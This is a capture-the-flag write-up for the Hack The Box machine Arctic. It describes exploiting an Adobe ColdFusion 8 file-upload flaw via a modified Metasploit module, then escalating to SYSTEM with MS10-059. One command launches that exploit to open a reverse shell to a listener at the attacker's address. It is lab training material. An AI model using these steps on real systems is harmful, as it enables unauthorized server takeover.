Arctic - Hack The Box

Resolution of the Arctic machine

July 5, 2020 - 5 minute read -
HackTheBox

Arctic is an easy level machine based on Windows, the initial approach is based on a file upload vulnerability present on Adobe ColdFusion, this vulnerability allow us to upload a malicious JSP webshell and gain access to the server. The privilege escalation process has two ways to exploit: MS10-092 or MS10-059.

Recon

We noticed that there’s some ports opened, but the port 8500 caught our attention:

In this port there’s a service named Adobe ColdFusion, version 8.

After searching on Google for any suitable exploit, we found an interesting one:

ColdFusion 8.0.1 - Arbitrary File Upload / Execution (Metasploit)

Exploiting - Fixing and using a Metasploit module

The above exploit is in reality a Metasploit module, it exploits a vulnerability where it’s possible to upload files (malicious webshell) directly to the web server throught a ColdFusion module named FCKeditor.

This module is located at exploit/windows/http/coldfusion_fckeditor.

But there’s a big problem: this exploit doesn’t work as he should, part of his code is not compatible with the Arctic machine.

I made some modifications in order to work properly:

The problem was in the HTTP request timeout of the original module, I changed from 5 to 20 seconds. I also added a verification loop in the handler’s part to ensure that the metasploit session will be created.

Exploiting - Using a custom exploit

For knowledge purposes I made a custom exploit that uploads a malicious JSP webshell throught the ColdFusion vulnerability, trigger the exploit and spawn an interactive shell to us, it’s available on my GitHub :)

Post Exploitation - Manually escalating privileges

To manually exploit in this method, we need to execute a compiled exploit named MS10-059. The compiled exploit can be found here: MS10-059.exe

We set up a netcat on listening mode and execute the exploit with the following arguments:

MS10-059.exe 10.10.14.XX 4445

Done, now we have system access as administrator!

Post Exploitation - Using a custom exploit to escalate privileges

For knowledge purposes I also made a custom exploit that uploads a malicious JSP webshell throught the ColdFusion vulnerability, trigger the exploit and spawn an interactive shell to us, in this version I added a privilege escalation exploit that executes the MS10-059 automatically and give us another interactive shell but with NT AUTHORITY\SYSTEM privileges!
